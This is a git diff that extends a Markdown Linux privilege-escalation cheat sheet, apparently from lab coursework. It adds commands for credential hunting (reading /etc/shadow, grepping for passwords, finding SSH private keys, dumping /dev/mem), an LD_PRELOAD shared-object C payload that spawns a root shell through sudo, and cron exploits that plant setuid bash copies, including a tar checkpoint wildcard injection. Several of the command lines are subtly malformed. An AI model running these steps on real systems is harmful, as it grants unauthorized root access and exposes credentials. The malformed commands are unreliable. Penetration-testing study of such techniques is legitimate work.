@@ -1,7 +1,120 @@
 
+ * [USER ENUMERATION](#USER ENUMERATION)
+ * [STORE PASSWORD & File Permissions](#STORE PASSWORD & File Permissions)
  * [Automation-Tools](#Automation-Tools)
+ * [sudo](#sudo)
  * [Suid](#Suid)
- * 
+ * [Crontab](#crontab)
+
+
+
+ ## USER ENUMERATION
+             
+    whoami
+    id
+    cat /etc/passwd
+    cat /etc/shadow
+    cat /etc/passwd | cut -d : -f 1
+    cat /etc/group
+    history
+    cat .bash_history
+    sudo -l
+    sudo su -
+ 
+  SYSTEM ENUMERATION
+              
+    hostname
+    uname -a
+    cat /etc/os-release
+    cat /proc/version
+    cat /etc/issue
+    lscpu
+    ps aux
+    ps aux | grep "username"
+ 
+ 
+ 
+ NETWORK ENUMERATION
+              
+    ifconfig
+    ip a
+    ip route
+    arp -a
+    netstat -ano
+ 
+ 
+ PASWORD ENUMERATION
+             
+             
+    grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+    find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+    locate password
+    find / -name id_rsa 2> /dev/null
+  
+
+
+
+
+
+ ## STORE PASSWORD & File Permissions
+            
+
+
+    history
+    ls -la
+    cat .bash_history
+    history | grep pass
+    grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+    find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+    /etc/security/opasswd
+ 
+ 
+ 
+ Files that were edited in the last 10 minutes
+                            
+    find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
+          
+          
+         
+ In memory passwords 
+                
+     strings /dev/mem -n10 | grep -i PASS
+
+
+Find sensitive files
+               
+     locate password | more           
+     /boot/grub/i386-pc/password.mod
+     /etc/pam.d/common-password
+     /etc/pam.d/gdm-password
+     /etc/pam.d/gdm-password.original
+     /lib/live/config/0031-root-password
+
+
+
+SSH Key
+                        
+     find / -name authorized_keys 2> /dev/null
+     find / -name id_rsa 2> /dev/null
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
  ## Automation Tools
  
@@ -18,6 +131,84 @@ There are many scripts that you can execute on a linux machine which automatical
 - [linux-exploit-suggester2 - Linux exploit-suggester2 & privilege Escalation](https://github.com/jondonas/linux-exploit-suggester-2)
 
 - [pspy - unprivileged Linux process snooping -                               ](https://github.com/DominicBreuker/pspy)
+
+
+
+                                      
+                                              
+                                              
+                                              
+                                              
+ ## Sudo 
+ 
+  Enumeration
+   
+            sudo -l
+            sudo --version
+            sudo apache2 -f /etc/shadow
+                 
+                 
+		 
+		 
+		 
+ Sudo resource		 
+   
+   https://gtfobins.github.io/
+   
+   
+   
+   
+   
+   
+   
+  LD_PRELOAD and NOPASSWD
+
+If `LD_PRELOAD` is explicitly defined in the sudoers file
+
+```powershell
+Defaults        env_keep += LD_PRELOAD
+```
+
+Compile the following shared object using the C code below with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
+
+```powershell
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+	unsetenv("LD_PRELOAD");
+	setgid(0);
+	setuid(0);
+	system("/bin/sh");
+}
+```
+
+And Type Command 
+   
+      sudo -l
+   
+And Output 
+
+        Matching Defaults entries for TCM on this host:
+        env_reset, env_keep+=LD_PRELOAD
+
+      User TCM may run the following commands on this host:
+           (root) NOPASSWD: /usr/sbin/iftop
+           (root) NOPASSWD: /usr/bin/find
+           (root) NOPASSWD: /usr/bin/nano
+           (root) NOPASSWD: /usr/bin/vim
+           (root) NOPASSWD: /usr/bin/man
+           (root) NOPASSWD: /usr/bin/awk
+           (root) NOPASSWD: /usr/bin/less
+           (root) NOPASSWD: /usr/bin/ftp
+           (root) NOPASSWD: /usr/bin/nmap
+           (root) NOPASSWD: /usr/sbin/apache2
+           (root) NOPASSWD: /bin/more
+
+Execute any binary with the LD_PRELOAD to spawn a shell : 
+          `sudo LD_PRELOAD=<full_path_to_so_file> <and Type NOPASSWD program name just vim,nano,apache2,ftp,find etc >`
+	  , e.g: `sudo LD_PRELOAD=/tmp/shell.so find`
+
 
 
 
@@ -73,7 +264,7 @@ OUTPUT
 
 Exploit Shared Object Injection
    
-   mkdir /home/user/.config
+      mkdir /home/user/.config
        
    Create C file Type Some Commands
        
@@ -129,6 +320,98 @@ Environment Variables
 
 
 
+
+## Crontab 
+
+
+   Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. 
+   Cron table files (crontabs) store the configuration for cron jobs. 
+   The system-wide crontab is located at /etc/crontab.
+    
+    cat /etc/crontab
+    locate overwrite.sh
+          
+          
+          
+   
+Cron jobs
+
+Check if you have access with write permission on these files.   
+Check inside the file, to find other paths with write permissions.   
+
+```powershell
+/etc/init.d
+/etc/cron*
+/etc/crontab
+/etc/cron.allow
+/etc/cron.d 
+/etc/cron.deny
+/etc/cron.daily
+/etc/cron.hourly
+/etc/cron.monthly
+/etc/cron.weekly
+/etc/sudoers
+/etc/exports
+/etc/anacrontab
+/var/spool/cron
+/var/spool/cron/crontabs/root
+
+crontab -l
+ls -alh /var/spool/cron;
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny*
+```
+          
+          
+          
+          
+overwrite.sh Exploit
+      
+    touch /home/user/overwrite.sh
+    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+    chmod +x /home/user/overwrite.sh
+    /tmp/bash -p
+
+
+
+
+ compress.sh
+   
+    cat <PATH=compress.sh>
+      
+OUTPUT
+   
+     #!/bin/sh
+     cd /home/user
+     tar czf /tmp/backup.tar.gz *
+          
+Exploit wildcards
+   
+    echo 'cp /bin/bash/ /tmp/bash; chmod +s /tmp/bash' > asif.sh
+    chmod 777 asif.sh
+    touch /home/user/--checkpoint=1
+    touch /home/user/--checkpoint-action=exec=sh\asif.sh
+    /tmp//bash -p
+        
+        
+        
+        
+        
+Change File permissions And Exploit
+   
+    locate overwrite.sh
+    echo 'cp /bin/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
+    /tmp/bash -p
+   
+   
+   
+   
+     
 
 
 
